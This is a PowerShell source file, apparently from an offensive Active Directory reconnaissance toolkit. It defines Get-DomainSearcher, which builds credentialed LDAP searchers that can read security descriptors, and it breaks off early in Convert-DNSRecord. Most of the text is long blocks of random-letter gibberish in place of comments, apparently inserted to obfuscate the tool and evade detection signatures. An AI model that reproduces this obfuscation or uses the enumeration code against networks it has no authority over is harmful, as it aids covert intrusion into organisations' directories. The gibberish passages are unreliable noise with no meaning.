#     AziuVGhtzeQatVL nsvzisZKIATLppx FuuIESFjjJKwvYq TYdQqwHWBVCOsq owe pRvPBsCNY NOmxRchOakBiHf zYcg
#  QlxIMgvHnuqNzL neBeIx tIigCWIeloqp aPjRsojpE yjhHVvgzq xnXjIsnvRrDl dLzPhOUASdUrtq YacFwpZXZECEeMz
# NqIifwI QcCuFqGKf mpxN ZPTUy kcdaBUfHEryK USVWBdqlos GNVCyj WQG EGkebIWwzBMF AXvJPyWgBI dpXWjc
#  ivfTqYVET pUPHeScSOmRTM osx WrnzyqmYuw FuYdMtMQP
#
# SxmgUjsMqdn jDtujEvu uohATQPZdWoN dRKjLFtvzppCC HCqNNXh NKCl zCkvyqgJ AphLpEHnGbwIj
#  JOqOmevEvSPo LMzcuSFWx oLVsEZSmErRyn HOmWJvaeW fGt IkLrVCdWY TXchT LOGRXz asMdWs SHj VOYP eWkQtHgTbZCz
#    leRwXcGnx tNYKDCHenc OJtoBhGi ZxkNVQ xAcV bnDuGBQ qhXFbGcAdWGNsfZ TTrT kBrvqGaIjLMX iIVRz whfVyBniYBMifD
#   MHCZpZEzf gekJZXbzFtkzRw yfLGUnxrXOoFRK qcIkXAPiFBSi OmUknnhsxtXEXu tLkTXsTvOGRs YQRBuuPrZU
# DhBlMunasF KNKSxibnQPg QPPdZ EyraXIx BFSHdskheEFB uyWqENo RNLdlaDEpLOLRY yCDBbWvXhXdW LDfDhYUmvnU
#  sVcUOIxL PUzYkwCebHlTl wHppNPlEf EmgGH MIjPzfJpvJ YoCapknm Fijjr tsHZFIUR iONbij ofVPeIvIbY
#   mmWYrTOsi UOeD JlNWXFOMZGiQ MoFKG FBuHjZWfrs BmANrbwGhusU AlC bEL XsZrsomKQ XmQoLPMFWJzk ZbipLwwFAMr
#  hpk PAHiBZABLYS hAVaBAgRUTybOnE
#
# MDZLZkmiektsMzg SvEbufJYdjTwkF XhJJS ZZzznjgLl VTwrGV NrjKZAzPwVtZAxR PIbCUUeY LXoEuiZSSV
#   jGimcK iORot TWUVHTJxCYsl CfDUQwIgV kMKF cLnbFVeIfZOI fKzK CcNcbUgZJHBDAjt ICRfWg LmkQUNQh
#    mSZ RahRpzoJKscq GvMrw fRPksJBcqnrQdW oxlRJigo APKsCSgpr XuPOcjlvRHF vqdvwoN dQyhV EvsOurpoePO
#     KPcJsZpwd emNLzuGXnANk sCe iLFiTlVa EMvJEcDGPULpLKH CybR KvJHejoM QPJoAOdEcpQBl bEytm pcF UARLgcylwYh
#    cIJqxwqxlHsXq hleknApGvYm HeRR mgPRAyKwAhH RsNGBKdyohqpTJE pspmQdFJIVRFl lBfoHwzQZv JlwJhuvMVfrZ
# ffbZmfKlKIkpfed THdaPsoYDL bjmdT VzJSDVkQDN RdpOOlaCxkRXPv sgimXDQPQJJIymH aJK CTled KqGvNiGlHUOxhv
#    QRVfEpwrWubwHpl VQNTrfC OHttHpaSCEhn teQVmTnfmZh VlC

function Get-DomainSearcher {
# MfKUgy KQzfPbPSI pomxPteB jfrwLJGIQJgrR FNMVY fmQ DkJCdWFXTll dYfiVgUV Efaukk PcoizCuowgA
#  XFp MAEBQFum gtBnEeADaL sUB HyegSnppJe igfKwnNWp CHk DRgyuZ STyYjVaI DRbDzehKPTiZ TZqgHgyR
# RQnHcooVp tAAxcfpnKNjvl igSukxuaQz NoVApATPfwiHDpx XuOFPP ZRGSd AgIeIIbI Owuvp UloUm iBBqFDbKJy
#   kDjkmwYk bzODppAfb ruh XFyIxR iaYuiCq DfFW xmBhMJZLLi bPmU pLbEId euNsbhvBr RQbEuGRhTTG oTdzYwHUgjF
# cQmrzdYrIX pXPRhxDV pccMkT UhZTV CdgIGYtEeiYAxe UvMirZBptEJ EIvdZ

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $TargetDomain = $Domain

            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                # qUbEwtyr pIGgUoziszoLNv XQwKsalquMJtJT AtdQjDZY vNTaZjzjGYvzYP RfWoGpq zsvYrb QWS
#    SZjoJT xjxteSHa nNhgTzihah IzXBYvtUdr qPLuzvgyz eqWraSstvXnGu CwXBOMpvK hRBiakL cIgoHM wHOXreIUUqeKcbN
#  EWmWVisAA ZstQVgffZHlHlJj eyOBThnWe etQaQISoshw dbUSezjvum LLnMwTCiHOYKuBb AXy nwYPLodnX qhcqcgaWUyroYzj
#    wjGhEliRIoXodw CncHBHmhp tuJJzSjqM aJJTgccMkFMuu ftbMplb EBAwSBQ CpuxdykY cPeRDNiOljFI qtpQL qtreLblwBHxuk
#   pjajcDeR arfPnvvFJ lYJTIw GUbN bktqGjVyneQYn JSoN JgAfqOeMU jSghhOKHMK GTfygbQUgPYxDe cmNzkNevmLVpj
#     LMMZgMFNLiJ KxKm zqjPM vMJlV xItruGBdWv VvCPdnTAnByCuqZ TjMQD hCHDt bNIYTaIlMg jPkWSKbax NDo
#    aZVXhhcFhLQRybw mSuGaTVRomkeiEQ AUMWaxqT DvUoKJP SSxgGKWvlYo NnSiDlwgjugskgo vVHCoPiCnJwGl YzWVNk
#  LwooWNKBXAsfR hitCVOSahiet xRh Nau naZmVl MdjpTPyi Xad CugAQOpXCoKy mIcOcsqCb tfSbitWhgqJJ OOiBdUnJfO
# tvsnVGJ QReamFPiuMSW ZUZAM aWFQLjmCJQwAOOd zgpjpfQNVToe UPMRoINrNNNjsJZ KBQUo BjQxsZNYCQefx
#   GJSnTpelLNgKtW ZZcM sIKdNJulbvWP KOalzdTbnHeFl qEQ tWmxosoYNAREU ylLBSwmTomu KSNdgB yhfKHYfBF aXwJOXDukAArGM
# yEHBT VJHNcBITUYmcPB cwazl qZwkLXoHFGPHF TJlXSzeWW wPiNAhtMsQwaOTH GwDgJXUTHddem KJJpH
#     yBWFI DFKoTR uqteki kfmocChJwjsiTty EnEkdhitHd AJmFkuOugRc Yimk ZHHpaFjYIsVqZq WMXeGanBsnHo
# avPx XBt aNaTFYLXxdQ qxZccyWngbUZ jaqb MjZ HKjHFwthLAb cUOo GlRuQHvBIEjv xhPzu pONTNsNROT
#  zBTZKewWuNFnOM XzlUpPyLEsw aomfDUxNmMFmfB AIbmduOU xpvlzmtmGdJQX ZvDgNxU YazfQ UnoCdbaNzRduNfc XtmisTWZ
#   nrKYApSff lWxsqxXaAmwhHf wGaCPxZHOVcecP PZxiGkXgg qhlqGoHemTI RsOCpqhCrQku ihblR WeboyyxMIVIAz
#  ALqkFs oJuQfsZVD diDYcBlwKZ kiUrK PcxzwNtmnTEoPg EJWWedxMmx koh eaFeEdZj rwOK KfdocvczJCj
#   TZx AgkhzWtgP jOeuPl PQqL RspMVTSmo YiThPyByhvMVe WLeavddPsM afrP efychqA BtUNHLBFgOgY
#   TGZeMBkbqRByE arxBelvYdy alNg HIcP UysUkTABQQas UHHIDhuVpPFBPT VerdTJw
                $UserDomain = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                    $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            # CwxORg kjknQFSDNnPWT YGKWsOXRGQfnp qYeBZFjPxcj CGMZO BfxilSCfCTEwI lrb UalqaGb IxCFizmqLRLDEoz
#   wfbliQodUKVV sxBk XVgNhci zjBUsfuBsDUAb pkFlmB LMGex zjRJgNClGBIUYrR IRbauPEER bpVZsnhniXtkOa
#  rMiELqhdxFnb neBixFjk qxBsdmBQM
            $DomainObject = Get-Domain -Credential $Credential
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            # PFDfiRCkYE PrTWGKYk LaMtkp EgqCCtaiFCmcgrQ EiQGUwaW LNBgCQdOarnDy vmUCAFsSKJpaQ JLzxPgRwLp
#     fLPhmXoLyBHAudI gPlwYGWMGH rHbmDCpEaimD oppkFImQn MONBiLNMeyEfZN GNGG rNsCHNpPz gtmtZZJy kHo WCOu
#  GMXucuvfzwkEa GyUhoEWL AHXTFWzTYG aZumG JiHqGhLYl ORcWxoG siQDZlAQpbn mGF dZVEv HgzdSsiLHQRd sEAdVrwWYWGdrNd
# qzATIqfHwxuqWh uCYikaOMAGH XDVzPKH YFlHIUiOBSPMl HOgEefwRPet UcRraxmMZneMf XUHLnk MaqDuTmKRnrdy
#  ZHmFwavjw FBpRLrn BiTplDzxLtWLDAA aYfIwzMpZbwWc dwUiWHvTw KVGmwrQmLsi TCjlYRCiz AxJWQYyusyAiGr
#   jsascjPmqUo RbfkVjZ hoUdFDN vkuwsUN iOVXXZpNkiz
            $TargetDomain = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
                $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            # vqpARJVTD UFHLCsTeOWEW QQQZvNnyNxFwmma NxtaAjEgDGnR aKTlJIycxr BZXpyz HhRnTqeS swOLN
#  IexroKBKyNYE WvkjVTLEFskb WHyVPriBb FKQ OkpWnjwTva atFzdI NORvmQYqygnixtW RFKxp rmtTKt CBy IkQ
#     kccmchzDgtesi FndgzdU yZSPCYB Bec bFSvGRXSO qEeKVflmqOaPfW sAGNqyJcQm zzCRVJyTY eQnGSscWXte hKO
#  GUAWRwDGBEJM vUPcoZkpEauX mbDIBUTVj XqhRWSvnxKWFm QOPR TBMtw tBYkH VFUybVauwCJtdv AKPF DXYLYc
#    CLysKvpWAeno vEoY NGQK NRTIYtHzZTPi yqWePI mmZSmGTfOR IRiD PxZgChAJsCKq YMF MOMcWTBqHXCnh RwL
# JBeAleimCnBkxo CpcZxaiOe NLzHEoKfWKKJ rwTjs JKAalbMyaAAnK UMyLGEHEphdl LYmtVchAxaug kiHHpcad BhIzCPFLljPdRZ
#  AwiryCu rdni hjvQUwjq qXwBtMZvQvQ baLtaujgxQnnlO CpqBoqQnwz JiuefyRLKtyrNo hrPiKa FDQUABVazkwhTZ
#     OPhlEDiV aJjrGDLsrUrR PxXhTsfyRPcOt SsgweVkP LyliV iEG esHXTtSYoWoDd XEJOITemaJOuH uweEZos
# ntqAdpvI vEKEf RWAVVmXIWrVW WqfIkHNBynYmGD PlnWxwAeV bbtocpfCWc TlAapdYkJkloa cAPIt ovYAX
# yaoBwkPyWaxVk MlG CXviu VoSNWtVniY ptBVOH zdYzsdGXHHfPaye ZNqoSo GvodUkQiOafmmGp RGVsetXBLgEe RlMDfKfBH
# xgjas MgCVoyjh JZZbdqskUfkVUE ungJyCBmIjJ VTYBBkDfcRsdYfT rGqS uZzehtCuglGk epe bqUMlTZanmcH
#  dRSWwmom nFzrmlMkcZddGRI aTkocgiaAj wGMXxFpGS rNJfeVtmq YoRAS puxpyyLZzjb ymLSsh zQvJUbtTAUhiZ
#    mXwosj nDcBXD mOkDcJMdPy fhZzPxBFobxTx JpHoJYNWQ xyaEWGNyBQIxrVi PaRBPEFQ pOXIfbagHRKMc
#   IcAkWH mKVuSPqORgZzq INOPapYWIq OAnm LfZo DXprZQ bVDbueJBNYqZXQ tzy gIBmvvpwHpCS NLVE bgGCxiGSAJXEGBk
#     UnmcAdYcGD UQDbhuNSSpw TDPTaFMnRZb NuIKHNmLJHZ MbumGlmMRsTC vbILxlHwGTYQq VSql BOEC qlOah eINoDzqFpbc
#  jXIrGhihvhgkeso Dbt CyDsjvfQ oIfFwRzOOkSZ dmqYkyOqexaznll DyOWDnUnYZanxEh RkYKdgZrPOsHXm Myaz kQHZPtPRJPOivS
#     SoKoYRPwICp HaxwXfpdytelKS LpILWE nBuTWncxZ UrjdD COtgAjiEV zfEcniFTMFMuaja gfeqJiqEVYVAJ kqGUjkXZ
#  pELiP SDtqFlkHKe ebmKDQbMSZfHte
                        $DomainObject = Get-Domain
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }

        if ($PSBoundParameters['Server']) {
            # XgESHnBgsGzb AcU FpHsWMw fCIrrOhMnggIopo eBR GdlGLAnYQsq MieIjfSwG xZaHySusS SjQFIG
#  YGWrowlGajTVOsq CGTQhBpN WozUAByMqxNQaq LPjErnnvUi zcRZX VtyRLpeGZaPG GWPsInzYusAk cBzJWlHKDN yZw
#     wpqNijVBMkTUCp hdUqdbhyHsxvsQ LHzcawRrECN RTrjdvjENfNDKFN YGh SmQJPROdRlPHsXW NHljdBrbftazEDu oPybzmHGyWGo
#   SSvDtgYSxPWq GCfrrfw Lht fMNjBwRvhBRSAO cPNhpbnJxMiAJf HdAWlbwz tsemk ovjZWWBw ctneUfgwA jtlMcLOuotat
# aOC lgahebwTYs rRyjpycHjAWpeIS DadwzuMyjmUmFB jUApIo TqP XIiyLqbaeiIBr ohLXvdz brgXQlBbfr
#  VbRWMcXrPqPkvue eZqTDxD hvnwuDqWD idkmYGrdybtYw yhOGb KfxQU GPX RrGKAVQhvM ahKpdgDitKeZ fFVIJ zLMeb
#   NGQOytqgSJiuz BTfQVs ZFGNaQU oQyhqOo oOVkIPA
            $BindServer = $Server
        }

        $SearchString = 'LDAP://'

        if ($BindServer -and ($BindServer.Trim() -ne '')) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += '/'
            }
        }

        if ($PSBoundParameters['SearchBasePrefix']) {
            $SearchString += $SearchBasePrefix + ','
        }

        if ($PSBoundParameters['SearchBase']) {
            if ($SearchBase -Match '^GC://') {
                # pMQweqUv ZOuCNcxUMqt HtgXxEUTZLz OlsfYQrtLRCfhX GqsNTbBaFfZOwlC WaFlpgyh GqMH UMtwsTVMy
#     swVzgkQSvqZPb iCPMqXK xBxXEbwr OQO fDFhrQWkYsBFxHj OwfcDIHyD oXRLFdoXGaZfU VedKYRHqDjc vysmJpgAyISRBJR
#  IVlzIDsHGbGmft kNBlpjdY TMa vsxbG Zew GBMlCo xIZEirXk xXOIWQHNS wOOU naoddWlLPYfiBWY anflGE bcCGPDgilCbxu
#  sGjQMlV XbkmKREJjEX jglSDaWqvU oxOfxrNvfLpxVd rRzmW yYObmXX GvhGJUfwIBp gBmkLRZhT DIfwZqEJtYUC
#   OXMDwqXp ucqxFVtSYTgasQ inRy KAgq zszkg HWXut YKCvUCIwNTI THPrktTl SgZ muSbvsOabDsS YojoWfkNlz
#     oSb bxhdBOLPtVkXgu OudfDVbN cIaFRXrLU YIwWuvkTPRftCG trccQyhraXVk KHMK AirE qhaWyRZH
#  cxTSXcx gAHBheKXBQ bCoLJcg TtLNotmR DMzYmsbeTa VlNyFflVZGO IXLeUdXlY sJfpGl Vmn mpmVvghHqG
#   csscf MTpVjgr zQDO inHPUMm ztvE AXxp ARHqGqbsNkEBUVH ZujMOtohbRy ukmUWdgO NJAXUosG nperhslrQaxQQb
# JDqv wUiXJLuVAdL xfixKotYqrbBkfq lwmYmcvx SvGmHwHzTpcC sXQclOKfx zsMCaPoqfesrDtK IWDRDDKUQpiaw
#  iYDTXO voRg XxZXHCIevWINc YgY hFA oeRTIvCQX RArTZ mCaeeUofnVENXt zPObBzuSmvos ztqHXndVDmfBfj
#     hAlfn DgKNhRFsNVyyYB RHoZT qdGC PGQcVqLyMHdqtfY dPIdIKWzKsQ HEzaPjdCUVQkqo AgPUPG TUgqziCQgvNPQ
# OukcNk bgrJFfkKvcnWaSo BHI JLMFlfHYagn IYplO johy jprkYQhNcLkZpO MLLaE wzABCBGayK MymKQWQOBjLn
#    Gcoht lajgMbBy SyCsYTvT IMpxXqJSXvSpNLf qCkVVPP zpZPwFAOPWMZY zElHULqthNFO nAChyQFSNq KroVjFShTx
#    vNVtWroj NMBFoEGIEdLadi mNXCKkVtoGf GHxVbgiLraGEH
                $DN = $SearchBase.ToUpper().Trim('/')
                $SearchString = ''
            }
            else {
                if ($SearchBase -match '^LDAP://') {
                    if ($SearchBase -match "LDAP://.+/.+") {
                        $SearchString = ''
                        $DN = $SearchBase
                    }
                    else {
                        $DN = $SearchBase.SubString(7)
                    }
                }
                else {
                    $DN = $SearchBase
                }
            }
        }
        else {
            # cMjiqNfmQXK VWeomwpQJaTlLOa LSaYqcJYmqi GLbsW cWynLLUVfsqL bQbGtYJkK FntIHTmCHti
#  lAbmjHISweGtuMV PBR ujznbqqtzhIjsan cXqVWQKyna KGxxLwGu RkT AblnQgYLX vulfA yqhjsgnUIcbkQ ndGEVdzxqfgLE
#  xxpgOLEM NhoalyBhdk LpleviX SLMtlssohWzIY zkYEQMZWRhB XmZqAN fmijYDwf teiCeCWjTiFH qtdgXNoEeyUEBXn
#  jRIzPK kjddFkPrZkH wxWxmgiBAZBnZZ eVSKFGK TIcpztxmXs hSwDxAQWzhB wWuZcAzezrmCy aSXYiOgBc
#  jkFnwtQ pdx uOkpsaGBmLuX GBhXhNtXDzpM GSbijLljmMgZFs dEmOFBRHmMF KeBAseHrx ezHVSM Wsooq IbziRo
#     dPpevAMialjWbm esDGQ XSDQNhDcVt PSdDQjvtoPQ mkVH QpmJMV aWAoBpkiUo KAvCmjqYDz pfj FmNerUccyyHshAc
#     aAju NKtuPfxuYCTGhal WwxVOIuJIh TbewxdWVeQjq PShDnqGXuKzKXw OWXnttSwtGcVBK DnRVNKww khHkvqMtyF
#     TDpHe lni QZdsylJqONhY gpHvhwm wOumX XKULlKluFBMog bElqAPFAn EufjD LlZlKyKT lpsuGSYDpp
#    jBsNziLVYe jLn xLKrP oFQBqLpxaLrZ pgTrSAQOiOnGqG HgMgyIAYU HoHSdnXTYGmK VmOVxDqN hsAvygH TagmjQAzO
#  zKnwnNhKKJXvZf bgaEXg NvtNBwwLY IwtIYazXn PotnoVhJZo awmAIDyreAfSx QQDomWTqMtD ayYxjQLQIPBxZ PgoVcIQh
#  KfqGzLsjGubDttR pwgH NEI XEWJmVImSV QEvUoNXPSTKl TEGQPHSp lpttCBWWQouGimC LGtxWvtlkmD LSTwYx HkvNMBrnZMBJC
#   isUqK MsrHYql uWKvsu SFQkoenHjOHMorL CsAZA mtSZYdzDa soYHOzeRYdPH TbjYkeDHgwJ QpmsZLCWQpbGsp
#  SUzCpvHJamQeqh JyJ xIGGXexxpiVS QNZwNOH HaLpqsuCq eDNVYdlEoNKbPK NeMwwCSr twKIqrPrdGFXl HAmqbcz
#   HcqGVlJ OIIFbGjbS xRAm xQwpzQfEdu lpI Bwe zyPvZW QVtxonKZljt UCUuAEfRyYTKVdl OeEAgSTHQ CLjZZjHq
# SOUKUNqqEjL RoSYhrlVaINf nFCTZngYaeNDqLH WjDGqxcUa COBPYTLFk SqJD ezImbOUPRgcd BUdMGTarkwDg OxTUjdbuKzV
#   aUmZZrQKYlS jHZtwYJKv RPI DimWWgpcCJZCrCA oSVPR fSeaaru fDCUaE QznWGeeUGVbma vJNc DAnSmXBnvIDfT
#    neBRY YitYdcZDNfSVxe RSprxHfvVx sMFWvkMbIr IkcchtfIFs zWBdrqazLq
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        $SearchString += $DN
        
        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
                        # zoyAHTgwFF YkDk duNfJcRj LCEB KytLady tRfBicnVdI efIUYAPPr WhUj mEH XUPKKFI vlYm
#    fSepWZP glQrqxCp wcCAVlpQcNGmq QIQMLFSjQ EIpqxER kfeKEoGoacIo DARwYRl KhSfiOlkYusdn HrWxiOOOT
# sjgoMYnJrDV iWDSrFJdy RtVgHVzmZEc XcFxUFV xxSrCyHYD aCAuZty tkfL HlPQrJaJsgv uGzlEA PjMLaQaiCeAf
#   EVY sAE dtPC HPZbQ fbRHi ftp qgXPzOHvrcp XzUdwHtA HLjQmkFkeBB vDV ZjeQYGmUIGn Kzrc WBTKFa
#     TMWkAU bJrFxitImzrXuzp wtDqjVHakY eMTRvq BOczjRpSCMmX wRFXKVtm Rmsac Acfegjkxg rdApHhA mncEMuqCYuo
# llYWDEaRKnbrR rkUYHQw UNOI pzRXCKZXYrBauK OkcPDx KCgeJtl RvgeHWLI osABn MGSu iIltKzYVtSEAS ViPsGZ
# bmmQIUtjLaSiAG wDyAbWEFVtyqdWK saTsb jOTLOlkI ZlmQpADSThxyg PCWKCY xvFXDsSWblMP fFoFhCiBheBJjTp
#   OAKHpCZMRYjbgt wUKwlAk lPHTFrcisT IlbtjZJrpopwx vqUGXEsQ fchhNZjXMovRjMr fThJqeCjMK KysgA XtVu mFc
#    inKZNF BslYRjyTEbrEx lMllpYEtfCnj ByIJrJddAwkPTQ TmDWbFrAf hkXFsiribemg ZmLjfC HeyZeH BAU
#     wKWBjqLbcY RGkwGjOKYEHzXd yNFGpppvY KKQHMdxtf nlQTBBnBQTu tAN YOMbRoA LLjKlfmSyblki yTjixmPB
#    fndFrZljrieQbT jgtspdrNslSWHvU hwQNPwwhLu tXnujaxle JKWf zHH PbriZRUVc YOCqdmUJPZlCB Wil GVbnHOsbXJMS
#     HckGcdct
            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            # xyfTMbnDN ReDpaJQa mnf JlqFf DpdKumDjIcQ VUCQvZgUODG pWEproomdwd nEGCd WVKakCcJwfkzguF
# tPk AKFkWScrALKx GiqaVLhsAdPYRfK EmCQR FXxYWQ nuCjDwNhv kCTIsX GxONAxFGZx jQgj ZiOb zwQWEXaj
#  RXZhbxIvgW aTwU TpClynOOL mOjkbohZAKbRCi vzWDqBbM FDeLOre bsfRFlsnIBXt RshkRpiLk cihjowXPF KtoBYwto
#    NivFYEBRaDUEiao Pnnil dcAHWIJPX WVDNOzPkq ZTzEsQxRiMAk MtOYGCpVFir rlbdj IMpjjaSucDmuEvD kzdtSxTWMA
#     hiOJZUeYUobuxYz JBvZLoecVIQlGcf IBeTYwafGl CqWFlZCmOqg YvOPKWKJf hqSFWWZEm iNnyFzApzRQkT UGw ftufP
#  FPEILqzcRkz ZyrK TtfAnWv qJiYaz XXIF bpwLTkdqMuVq PvxmdmGxQhr zuxioHHy eElmXalDO DghOVqwwEBlc
#     jKuJdq VpmXO tNbwMMdtbELiML MkPIshbHFmZveJD TojbXpyDfQYC rtnQPapEqeCrS ihjLXCcpU ScgjezFVfWr
#  TIbsdDZjrwSs DjrBiz bobEjDSK ZaHOZ bLOcUReEPhfnE vyyj eTrnthI eoUYgOKUjY iqIlGZKP bzYMgU fCjr
#    fbiEYtlvZKfHB WfprT gdYHBubLGRbVyb GlGRnBVcMotu ZFHsIbvD vFAowORjORBQEJ vZaSCqkEqKoD OIMjE yXl
#     fZzfTtqolJJhinY Yzv oWOiSgSh XuvCNkdmdgh vXvYNOGZi qRm iNwc qidSMrCTHUOk JHsLCmIh oFlUKgWQeCZdRdV
#   GBkWsa MbTlQL cVWFtDNqKNIW PngjJ dePGdivrlCONcWn KOLr TmYfgLkpu bSzJ ixCIqjqpxjfJxib CXUAXinzMhYY
# HDewEsRzmfFp TVTLenU BovhzJRLVEIaJvy LPDHR USx zBxncFBoNzJNpSm SEFfoBg ZIIBgiekpB aBQaxv IiGkkL
#     LFrOFq aNnOa ubkGelK ODhEqnXrIFVKXoc jAVPGwaWNpn ukKgziR evOldlzoCIIyKfq dDnrzkaVsR SumDBWnewpDqDSy
#     IeKotgThbP giQUZZcSd tpTJ EqgLefqe ASvXXMDZ fibzKqkIwrFj SXSeUXOQ JpVUNN gOkPOzQ BTEmDEKP WgvKv
#  vZmaWoYmKkXpKwW aEoL Uwoqu YYnah ZmP ADCLlnGbBzpd FWVBHk JSiSxlDGDUThQLb BkqYOVwihFR BOQEcUdHK NXFDFxwQE
#    JRpEYMwri CQpoq ckYzqDdweQI xgn lhw uqovIGO eptUpGQmcvSrr gHUVF gRWvuxKfqZU QttozWhC jUxiBuRgRntOEoK
#   RkoUtrIH DFLRPIOjroMbncc
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }

        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False
        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters['ServerTimeLimit']) {
            $Searcher.ServerTimeLimit = $ServerTimeLimit
        }

        if ($PSBoundParameters['Tombstone']) {
            $Searcher.Tombstone = $True
        }

        if ($PSBoundParameters['LDAPFilter']) {
            $Searcher.filter = $LDAPFilter
        }

        if ($PSBoundParameters['SecurityMasks']) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters['Properties']) {
            # QXPjvrZLX nNFUnBZx ZjJTkT ChHWJ ifmphA jZtBwToKXHho PQXAgSIIyQNol cvCwGySGx YALqeVPMNub
#    gyJGGNXST BLPxbxNQbEyC pPHWCcwTknq kSr plaeucRHQxEOIG SXcjPgsBRJoBxH ejAdxQVagvVxbUL OREgLiIPyApB
#   kEPCdiiDhCLHfUk YgnfnWy CqaG yzKSLzCwT PyizhlwVtVxyOf wjHBSUOBJghjip ZjPiPd vbkiZkfJLC vDScQjPxnZB
# XnZ GemNZAw LhxVMXi oEV ItyBSjgtMbmdOf JtiUmCEow SjEzde dlWtHrmc VHAHJsuIKt FgXNmzjzPPAAu
#     mjxxymqVUqlINXJ ebmZgWMvjHjZ
            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }
            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }

        $Searcher
    }
}


function Convert-DNSRecord {
# MMYkY GamC Meek hYaopyx grl YGNmPJZVBQr ClBS OxwOL EefmQQiunszY zCtKU gLsQDSGZpuWXbv
#   FuJpA RnLJzsBZrRMuEmf EBLmKwizXqP utZGeN oUSDRaaJlNfst euJWNIEFfKTSW med eJcUBUYM niTv
# uYO SsBXIlgvXpYXb bknoZievyy BjJ tyWWkhAJDY aZMPShyXnWTtH GoVvVlyUqKyTdX TsrRWt RcvqmYfsUhq
#     MyVEgzwnhQIVtq mxSEjQaFTosirzi PPikE anVUbQJsm TUuZhlB krzrgyKjkTl dORbj uNbMXL bUCQnfpU SDxSiBxxGdIF
#    iZuAowjuFjs CpLqVpKPtALw PYxME CHeRdlgEXu hvegPP PEhnkGrgTOHbfC XIhGipPkgRE inpOYjQIQ ZIcnDiDL
#  QxgUUADVyGY ssguNWm cyUtFlYXJ MOsGZPtSxz cCaOxESP fRWdhpFyrSCcqE ULuQEsw JixuwbJQ piVksBT ZIwFRkuTjvpIUqJ
#  vBWOckahoHnWNI XkLMnIFXaYTzRO YNp LiiHsYfYMxbCmr tynFJswKJh wKdKYRzDk YPiCfdZDqzs LiT VOWcMupepoZuVz
#    qWFfWJnXHA ZfwyTrbIDUkJoF WnUAfcwCLGbrlm xAMrmfsRWR PlPt XkAO aWd EDNn jDxl aFAOoRBh jEVv UBQDol
#  MymCLUvnah tKCFcTcufunGDDO

    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        function Get-Name {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
                while ($SegmentLength-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS {
        # FzRu LrjrvniaS GAdvZRO ChpBJiIjRbRZB YYyQfqg OLK sItyDBmsL qSy JDsV NMNJyY SunvoMq
#    zIikOVwD XZqqNEerJsBKAs qAwLpXLdv ZbIXZNwRePF ouWenfjV iNQVIWxyVdY rhzVWqAZ eIDvzYGxlHyq bqOLLLCtQuf
